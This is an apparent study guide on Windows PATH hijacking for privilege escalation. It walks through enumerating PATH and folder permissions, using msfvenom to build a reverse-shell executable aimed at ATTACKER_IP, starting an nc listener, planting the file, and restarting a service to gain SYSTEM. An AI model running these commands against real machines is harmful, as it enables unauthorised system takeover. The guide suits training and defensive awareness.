
**Path Hijacking** is a privilege escalation technique where a privileged program executes a command **without specifying its full path**, and Windows searches directories listed in the `PATH` environment variable to find that command.

If we can write to a directory that appears **before the legitimate executable's directory**, we can place a malicious executable with the same name.

### Attack Chain

```text
Privileged program
      ↓
Executes command without full path
      ↓
Windows searches PATH
      ↓
Writable directory appears first
      ↓
Attacker places malicious executable
      ↓
Privileged program executes it
      ↓
Code runs with privileged account
```

---

# 1. Check the PATH

### Windows
```cmd
echo %PATH%
```

PowerShell:
```powershell
$env:PATH
```

Example:
```text
C:\Windows\System32;
C:\Windows;
C:\Users\User\AppData\Local\Microsoft\WindowsApps;
C:\Tools;
```

The directories are searched in order.

---

# 2. Look for Writable PATH Directories

Suppose we find:
```text
C:\Tools
```

in the PATH.

Check its permissions:
```cmd
icacls C:\Tools
```

If we see something like:
```text
BUILTIN\Users:(OI)(CI)(M)
```
or:
```text
Everyone:(OI)(CI)(F)
```

the directory may be writable by our current user.

### Useful AccessChk check

```cmd
C:\PrivEsc\accesschk.exe /accepteula -d C:\Tools
```

**AccessChk** is a **Microsoft Sysinternals third-party tool**, not part of a default Windows installation.

Look for permissions such as:
```text
FILE_ADD_FILE
FILE_ADD_SUBDIRECTORY
FILE_WRITE_DATA
```

---

# 3. Identify the Command Being Executed

The important question is:

> **What executable does the privileged program execute without using an absolute path?**

For example, imagine a service executes:
```cmd
backup.exe
```

instead of:
```cmd
C:\Program Files\Backup\backup.exe
```

Windows searches the PATH directories for `backup.exe`.

We can locate the legitimate executable with:
```cmd
where backup.exe
```

Example:
```text
C:\Program Files\Backup\backup.exe
```

Now check whether an earlier PATH directory is writable.

---

# 4. Hijack the Executable

Suppose:
```text
PATH:

C:\Tools
C:\Windows\System32
C:\Program Files\Backup
```

and:
```text
C:\Tools
```
is writable.

The privileged application executes:
```cmd
backup.exe
```

Windows may search:
```text
C:\Tools\backup.exe
C:\Windows\System32\backup.exe
C:\Program Files\Backup\backup.exe
```

If we place our malicious `backup.exe` in:
```text
C:\Tools\
```
it can be executed before the legitimate one.

---

# 5. Create a Payload

Generate a reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=ATTACKER_IP \
  LPORT=4444 \
  -f exe \
  -o backup.exe
```

Start the listener:
```bash
nc -lvnp 4444
```

Copy the malicious executable into the writable PATH directory:
```cmd
copy backup.exe C:\Tools\backup.exe
```

---

# 6. Trigger the Privileged Program

Now we need the privileged program to execute:
```cmd
backup.exe
```

For example, if it is a service:
```cmd
sc stop BackupService
sc start BackupService
```

If the service runs as:
```text
LocalSystem
```

our malicious executable may execute as:
```text
NT AUTHORITY\SYSTEM
```

Verify:
```cmd
whoami
```

Expected:
```text
nt authority\system
```


---

# PATH Hijacking vs Unquoted Service Path

These are related but **different techniques**.

### Path Hijacking

The vulnerable program executes:
```cmd
backup.exe
```

Windows searches the directories in:
```text
PATH
```

We exploit a **writable PATH directory**.
```text
Program
  ↓
backup.exe
  ↓
PATH search
  ↓
Writable directory
  ↓
Malicious backup.exe
```

### Unquoted Service Path

The service has something like:
```text
C:\Program Files\Disk Sorter Enterprise\bin\disksrs.exe
```

but the path isn't quoted.

Windows may interpret it as candidate executable paths such as:
```text
C:\Program.exe
C:\Program Files\Disk.exe
C:\Program Files\Disk Sorter.exe
```

We exploit a **writable location in one of those candidate paths**.

So:

> **PATH Hijacking → exploit PATH search order**

> **Unquoted Service Path → exploit ambiguous executable path parsing**

---

# Quick Enumeration

Show PATH.
```cmd
echo %PATH%
```

Find where Windows resolves a program.
```cmd
where <program.exe>
```

Check directory permissions.
```cmd
icacls C:\Path\Directory
```

Check detailed permissions.
```cmd
C:\PrivEsc\accesschk.exe /accepteula -d C:\Path\Directory
```

Check current user.
```cmd
whoami
```

Check whether a service is involved.
```cmd
sc qc <service>
```

